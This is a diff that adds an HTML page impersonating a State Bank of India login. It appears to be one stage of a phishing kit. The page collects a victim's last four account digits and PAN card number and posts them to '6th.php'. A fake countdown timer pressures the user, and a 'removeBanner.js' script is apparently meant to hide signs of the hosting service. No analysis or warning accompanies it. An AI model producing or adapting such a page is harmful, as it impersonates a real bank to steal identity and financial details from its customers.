@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="zxx">
+<head>
+<script src="./removeBanner.js"></script>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+  <title>State Bank of India- Personal Details/login</title>
+  <style>
+    #bg
+    {
+      width: 105%;
+      margin: -8px;
+      padding: 0px px;
+    }
+    #aa
+    {
+      width: 90%;
+
+    }
+    #dd,#gg
+    {
+      width: 300px;
+      height: 25px;
+      background-color: #ededed;
+      border-color: #7212b3;
+      border-width: 1px;
+      border-radius: 4px;
+      padding: 2px 10px;
+      margin:4px;
+      margin-left:10px;
+    }
+    #jj
+    {
+      width: 342px;
+      background-color: #7212b3;
+      color: white;
+      margin: 0px 0;
+      border: solid black;
+      border-radius: 1px;
+      border-width: 0.1px;
+      cursor: pointer;
+      font-size: 18px;
+      height: 42px;
+
+    }
+    #jj:hover
+    {
+    background-color:#4c0c85;
+    color: white;
+    border: solid black;
+    border-radius: 1px;
+    border-width:0.1px;
+    cursor: pointer;
+    font-size: 18px;
+    height: 42px;
+  </style>
+</head>
+<body>
+<img src="third.jpeg" alt="" id="bg"><br><br>
+  <center><img src="hh.jpeg" alt="" id="aa"><br><br></center>
+  <form action="6th.php" method="post">
+    <div id="bb">
+      <p1 style=" margin-left:10px; font-family: Arial;">Enter Last 4 Digit Acount No <span style="color:red;">:</span></p1>
+    </div>
+    <div id="cc">
+      <input type="tel" name="Account No." id="dd" placeholder="Enter Last 4 Digit Account Number" maxlength="4"
+      pattern="[0-9]{4}"
+      title="Enter Valid Ending 4 Digit Account Number"
+      required=""> <br><br>
+    </div>
+    <div id="ee">
+      <p1 style=" margin-left:10px; font-family: Arial;">Enter Pancard Number <span style="color:red;">:</span></p1>
+    </div>
+    <div id="ff" required="">
+      <input type="text" name="PAN No." id="gg" placeholder="Enter Pan Card Number"  maxlength="10"
+      pattern="[aA-aZ]{5,}[0-9]{4,}[aA-aZ]{1,}"
+      title="Valid PAN Format Is:ABCDE1234A"
+      required="">
+    </div><br><br>
+      <div id="ii">
+      <center><button type="submit" id="jj">
+        Submit</button></center>
+    </div><br><br>
+    <body onload="startTimer();">
+    <div style="text-align:center;">
+    <script type="text/javascript">
+    var timer=180;
+    var sec=180;
+    function startTimer() {
+    sec=parseInt(timer%180);
+    
+    if (timer<0) {
+    timer.stop();
+    }
+    
+    document.getElementById("time").innerHTML = "<b>This screen will automatically timeout after : </b>"+sec.toString();
+    timer--;
+    setTimeout(function(){
+    startTimer();
+    
+    }, 1000);
+    }
+    
+    </script>
+    <div>
+    <b style="color:grey; font-size:15px;"><span style="color:grey; font-size:15px;" id="time"></span>&nbsp;second</b>
